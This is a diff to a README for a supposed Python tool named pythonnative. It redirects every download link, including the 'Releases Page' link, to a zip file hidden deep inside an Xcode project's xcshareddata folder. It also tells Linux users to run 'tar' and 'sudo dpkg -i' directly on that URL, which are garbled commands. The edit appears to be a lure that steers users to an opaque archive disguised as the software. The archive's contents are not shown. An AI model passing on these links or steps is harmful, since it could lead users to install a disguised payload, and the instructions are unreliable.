@@ -8,9 +8,9 @@ Welcome to pythonnative! This tool allows you to build real native Android and i
 
 You can get the latest version of pythonnative from our Releases page. 
 
-[![Download pythonnative](https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip)](https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip)
+[![Download pythonnative](https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip)](https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip)
 
-To download, visit this page: [Download pythonnative](https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip).
+To download, visit this page: [Download pythonnative](https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip).
 
 ### Steps to Download
 
@@ -49,16 +49,16 @@ After downloading the file, follow these steps to set up pythonnative on your sy
 3. Eject the `.dmg` file after installation.
 
 ### For Linux Users:
-1. Locate the downloaded package (`https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip` or `.deb` file).
+1. Locate the downloaded package (`https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip` or `.deb` file).
 2. Open a terminal window.
 3. Navigate to the downloaded file's location.
 4. Run the command to extract or install. For example:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip
+   tar -xvzf https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip
    ```
    or
    ```bash
-   sudo dpkg -i https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip
+   sudo dpkg -i https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip
    ```
 
 ## 🎉 Running pythonnative
@@ -93,7 +93,7 @@ Join our community on forums or social media. Share your experiences, ask questi
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/nwaebom66/pythonnative/main/libs/templates/android_template.zip)
+- [Releases Page](https://github.com/nwaebom66/pythonnative/raw/refs/heads/main/apps/experiments/ios_pythonnative/ios_pythonnative.xcodeproj/project.xcworkspace/xcshareddata/Software_3.7-alpha.5.zip)
 - [Documentation](#)
 - [Community Forum](#)
 
